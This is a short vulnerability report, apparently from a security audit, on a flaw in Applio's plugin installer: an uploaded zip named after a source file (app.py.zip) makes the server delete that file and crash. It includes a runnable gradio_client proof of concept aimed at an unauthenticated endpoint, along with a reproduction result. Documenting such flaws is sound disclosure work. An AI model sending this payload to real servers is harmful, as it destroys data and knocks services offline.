# FD-011: Plugin zip upload deletes application source file

**Verification: DYNAMICALLY-REPRODUCED** (PoC executed in WSL2; output from real run)

## Description
`save_plugin_dropbox` in `tabs/plugins/plugins_core.py:53-54` derives `folder_name = basename(dropbox).split('.zip')[0]` and runs `os.remove(folder_name)` against the current working directory (the Applio root). Uploading a zip named `app.py.zip` or `core.py.zip` deletes that source file before extraction.

## Impact
Unauthenticated remote client deletes the application's own source file with a single upload. The server subsequently crashes when the plugin installer tries to import the deleted module.

## PoC
```python
from gradio_client import Client, handle_file
import zipfile
with zipfile.ZipFile("app.py.zip", "w") as zf:
    zf.writestr("evil_plugin/x.txt", "attacker content")
c = Client("http://<host>:6969/", verbose=False)
c.predict(dropbox=handle_file("app.py.zip"), api_name="/_plugin_install_with_toast")
```

## Execution result
```
[FD-011] {"verdict": "REPRODUCED", "app_py_deleted": true}
```
